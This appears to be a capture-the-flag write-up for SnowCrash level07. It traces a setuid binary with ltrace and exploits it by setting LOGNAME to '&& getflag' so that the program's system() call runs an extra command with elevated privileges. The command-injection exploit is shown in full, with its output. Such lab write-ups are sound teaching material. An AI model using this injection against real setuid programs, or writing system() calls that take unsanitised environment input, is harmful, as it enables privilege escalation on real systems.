# LEVEL07

## Analysis 

With the command "ls -la" we can found a binary:
```bash
    level07@SnowCrash:~$ ls -la
    total 24
    dr-x------ 1 level07 level07  120 Mar  5  2016 .
    d--x--x--x 1 root    users    340 Aug 30  2015 ..
    -r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
    -r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
    -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
    -r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

The command cat gives us garbage data so let's try to use ltrace:
```bash
    level07@SnowCrash:~$ ltrace ./level07 
    __libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
    getegid()                                                                         = 2007
    geteuid()                                                                         = 2007
    setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                               = 0
    setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                               = 0
    getenv("LOGNAME")                                                                 = "level07"
    asprintf(0xbffff734, 0x8048688, 0xbfffff44, 0xb7e5ee55, 0xb7fed280)               = 18
    system("/bin/echo level07 "level07
    <unfinished ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                            = 0
    +++ exited (status 0) +++
```
## Solution
Here we can see that the program uses getenv("LOGNAME") and that the value is "level07" and if we run the program 
we get the following:
```bash
    level07@SnowCrash:~$ ./level07
    level07
```

This is the vulnerability we will use by overriding env variable to trick the program to launch another cmd (getflag):
```bash
    level07@SnowCrash:~$ export LOGNAME="&& getflag"
    level07@SnowCrash:~$ ./level07 
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

